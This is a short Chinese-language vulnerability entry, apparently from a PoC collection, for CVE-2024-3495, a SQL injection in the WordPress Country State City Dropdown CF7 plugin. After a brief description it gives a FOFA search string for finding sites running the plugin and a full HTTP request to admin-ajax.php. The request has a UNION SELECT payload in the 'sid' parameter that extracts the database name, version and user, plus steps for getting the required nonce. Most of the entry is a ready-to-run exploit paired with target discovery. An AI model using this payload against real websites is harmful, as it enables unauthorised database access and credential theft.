## WordPress-Dropdown-CF7插件存在sql注入漏洞(CVE-2024-3495)

  WordPress的Country State City Dropdown CF 7插件是一款用于WordPress网站的插件，它可以与Contact Form 7（CF 7）表单插件配合使用，为用户提供了一个方便的方式来在表单中选择国家、州/省和城市。

  WordPress的Country State City Dropdown CF 7插件在2.7.2之前的版本中容易受到通过'cnt'和'sid'参数的SQL注入的攻击，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息，导致凭证密钥等信息泄露，深入利用还可能会对服务器造成严重威胁。这是由于用户提供的参数没有足够的转义以及对现有SQL查询缺乏足够的准备。

## fofa

```
body="/wp-content/plugins/country-state-city-auto-dropdown/"
```

## poc

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 172

action=tc_csca_get_cities&nonce_ajax=[获取的nonce值]&sid=1+or+0+union+select+concat(0x64617461626173653a,database(),0x7c76657273696f6e3a,version(),0x7c757365723a,user()),2,3--+-
```

访问首页获取nonce值

![image-20240527192100424](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405271921470.png)

![image-20240527192111670](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405271921731.png)